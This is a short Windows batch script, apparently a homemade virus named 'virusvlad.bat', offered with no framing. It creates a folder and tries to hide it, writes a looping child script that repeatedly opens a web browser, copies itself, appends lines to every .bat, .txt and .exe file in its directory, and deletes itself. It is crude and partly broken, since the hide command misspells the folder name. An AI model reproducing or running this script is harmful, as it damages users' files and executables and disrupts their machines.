@echo off
mkdir nuoc
attrib +h nouc
cd nuoc
echo timeout 5 > figlio.bat
echo :1 >> figlio.bat
echo start www.google.com >> figlio.bat
echo timeout 3 >> figlio.bat
echo goto 1 >> figlio.bat
cd..
copy virusvlad.bat nuoc
for %%a in (*.bat) do echo.>> %%a
for %%a in (*.txt) do echo cd nuoc >> %%a
for %%a in (*.exe) do echo start /min figlio.bat >> %%a
del virusvlad.bat
exit